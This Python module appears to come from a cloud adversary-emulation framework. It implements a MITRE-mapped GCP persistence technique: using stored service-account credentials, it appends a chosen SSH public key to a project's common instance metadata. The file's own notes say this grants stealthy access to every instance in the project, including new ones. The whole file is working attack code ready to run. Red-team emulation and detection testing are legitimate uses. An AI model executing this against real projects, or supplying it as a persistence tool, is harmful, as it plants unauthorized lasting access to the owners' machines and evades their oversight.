from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, TechniqueNote, TechniqueReference
from ..technique_registry import TechniqueRegistry

from typing import Dict, Any, Tuple
import json
import base64
from googleapiclient.errors import HttpError
from google.auth.exceptions import GoogleAuthError, RefreshError
from google.oauth2 import service_account
from google.oauth2.service_account import Credentials as ServiceAccountCredentials
from google.auth.transport.requests import Request
from googleapiclient.discovery import build
from core.gcp.gcp_access import GCPAccess

class GCPSSHKeyError(Exception):
    """Base exception for GCP SSH key operations"""
    pass

class CredentialError(GCPSSHKeyError):
    """Raised when there are issues with credentials"""
    pass

class ProjectMetadataError(GCPSSHKeyError):
    """Raised when there are issues with project metadata operations"""
    pass

class ParameterValidationError(GCPSSHKeyError):
    """Raised when there are issues with parameter validation"""
    pass

@TechniqueRegistry.register
class GCPPersistenceViaSSHKeyAddition(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1098.004",
                technique_name="Account Manipulation",
                tactics=["Persistence"],
                sub_technique_name="SSH Authorized Keys"
            )
        ]
        
        technique_notes = [
            TechniqueNote(
                "This technique requires either specific GCP roles OR granular permissions to execute successfully. The roles provide broader access while the granular permissions offer more precise control."
            ),
            TechniqueNote(
                "Required roles: compute.admin (full control over compute resources), compute.instanceAdmin (manage compute instances), iam.serviceAccountUser (act as service accounts)."
            ),
            TechniqueNote(
                "Required granular permissions: compute.projects.setCommonInstanceMetadata (modify project metadata), iam.serviceAccounts.actAs (impersonate service accounts), compute.projects.get (read project information)."
            ),
            TechniqueNote(
                "This technique adds an SSH key to the GCP project metadata, which automatically propagates to all instances in the project. This provides persistent access to all compute instances, even newly created ones, without requiring individual instance configuration."
            ),
            TechniqueNote(
                "This is a stealthy persistence mechanism as it operates at the project level rather than individual instances. Changes to project metadata should be monitored, particularly modifications to SSH keys."
            )
        ]
        
        technique_refs = [
            TechniqueReference(
                "GCP SSH Key Management",
                "https://cloud.google.com/compute/docs/connect/add-ssh-keys"
            ),
            TechniqueReference(
                "GCP Metadata Management",
                "https://cloud.google.com/compute/docs/metadata/setting-custom-metadata"
            ),
            TechniqueReference(
                "GCP IAM Roles",
                "https://cloud.google.com/iam/docs/understanding-roles"
            ),
            TechniqueReference(
                "GCP Security Best Practices",
                "https://cloud.google.com/security/best-practices"
            )
        ]
        
        super().__init__(
            name="GCP Persistence via SSH Key Addition", 
            description=("Adds an SSH key to GCP project metadata to maintain persistence"),
            mitre_techniques=mitre_techniques,
            notes=technique_notes,
            references=technique_refs)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        try:
            # Parameter validation
            if not self._validate_parameters(kwargs):
                return ExecutionStatus.FAILURE, {
                    "error": "Parameter validation failed",
                    "message": "Required parameters are missing or invalid"
                }

            # Parameter setup
            project_id: str = kwargs.get("project_id", None)
            ssh_public_key: str = kwargs['ssh_public_key']
            username: str = kwargs['username']

            # Initialize GCP access and validate credentials
            try:
                manager = GCPAccess()
                current_access = manager.get_current_access()
                if not current_access or "credential" not in current_access:
                    raise CredentialError("Failed to obtain current access credentials")

                loaded_credential = json.loads(base64.b64decode(current_access["credential"]))
                scopes = ["https://www.googleapis.com/auth/cloud-platform"]
                request = Request()
                credential = ServiceAccountCredentials.from_service_account_info(loaded_credential, scopes=scopes)
                credential.refresh(request=request)
            except (json.JSONDecodeError, base64.binascii.Error) as e:
                raise CredentialError(f"Failed to decode credentials: {str(e)}")
            except RefreshError as e:
                raise CredentialError(f"Failed to refresh credentials: {str(e)}")
            except GoogleAuthError as e:
                raise CredentialError(f"Authentication error: {str(e)}")

            # Build the compute service client
            try:
                compute_service = build('compute', 'v1', credentials=credential)
            except Exception as e:
                raise CredentialError(f"Failed to build compute service: {str(e)}")

            # Get project metadata
            if project_id is None:
                project_id = credential.project_id

            try:
                request = compute_service.projects().get(project=project_id)
                response = request.execute()
            except HttpError as e:
                if e.resp.status == 403:
                    raise ProjectMetadataError(f"Permission denied: Insufficient permissions to access project {project_id}")
                elif e.resp.status == 404:
                    raise ProjectMetadataError(f"Project {project_id} not found")
                else:
                    raise ProjectMetadataError(f"Failed to get project metadata: {str(e)}")

            # Validate SSH key format
            if not self._validate_ssh_key_format(ssh_public_key):
                raise ParameterValidationError("Invalid SSH public key format")

            # Prepare the new SSH key entry
            new_ssh_key = f"{username}:{ssh_public_key}"

            # Initialize metadata structure if needed
            if 'commonInstanceMetadata' not in response:
                response['commonInstanceMetadata'] = {'items': []}
            elif 'items' not in response['commonInstanceMetadata']:
                response['commonInstanceMetadata']['items'] = []

            # Check if SSH keys metadata exists
            ssh_keys_item = None
            for item in response['commonInstanceMetadata'].get('items', []):
                if item.get('key') == 'ssh-keys':
                    ssh_keys_item = item
                    break

            if ssh_keys_item:
                # Check for duplicate keys
                if new_ssh_key in ssh_keys_item['value']:
                    return ExecutionStatus.SUCCESS, {
                        "message": f"SSH key for user {username} already exists in project {project_id}",
                        "value": {
                            "project": project_id,
                            "username": username,
                            "ssh_key_added": False,
                            "reason": "Key already exists"
                        }
                    }
                # Append new key to existing SSH keys
                ssh_keys_item['value'] = f"{ssh_keys_item['value']}\n{new_ssh_key}"
            else:
                # Create new SSH keys metadata
                response['commonInstanceMetadata']['items'].append({
                    'key': 'ssh-keys',
                    'value': new_ssh_key
                })

            # Update project metadata
            try:
                update_request = compute_service.projects().setCommonInstanceMetadata(
                    project=project_id,
                    body=response['commonInstanceMetadata']
                )
                update_response = update_request.execute()
            except HttpError as e:
                if e.resp.status == 403:
                    raise ProjectMetadataError(f"Permission denied: Insufficient permissions to update project metadata")
                else:
                    raise ProjectMetadataError(f"Failed to update project metadata: {str(e)}")

            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully added SSH key for user {username} to project {project_id}",
                "value": {
                    "project": project_id,
                    "username": username,
                    "ssh_key_added": True,
                    "operation_id": update_response.get('id')
                }
            }

        except CredentialError as e:
            return ExecutionStatus.FAILURE, {
                "error": "Credential Error",
                "message": str(e)
            }
        except ProjectMetadataError as e:
            return ExecutionStatus.FAILURE, {
                "error": "Project Metadata Error",
                "message": str(e)
            }
        except ParameterValidationError as e:
            return ExecutionStatus.FAILURE, {
                "error": "Parameter Validation Error",
                "message": str(e)
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": "Unexpected Error",
                "message": f"An unexpected error occurred: {str(e)}"
            }

    def _validate_parameters(self, kwargs: Dict[str, Any]) -> bool:
        """Validate required parameters"""
        required_params = ['ssh_public_key', 'username']
        return all(kwargs.get(param) for param in required_params)

    def _validate_ssh_key_format(self, ssh_key: str) -> bool:
        """Validate SSH key format"""
        # Basic validation for SSH public key format
        return ssh_key.startswith(('ssh-rsa', 'ssh-dss', 'ssh-ed25519', 'ecdsa-sha2-nistp'))

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "project_id": {
                "type": "str",
                "required": False,
                "default": None,
                "name": "Project ID",
                "input_field_type": "text"
            },
            "ssh_public_key": {
                "type": "str",
                "required": True,
                "default": None,
                "name": "SSH Public Key",
                "input_field_type": "text"
            },
            "username": {
                "type": "str",
                "required": True,
                "default": None,
                "name": "Username",
                "input_field_type": "text"
            }
        } 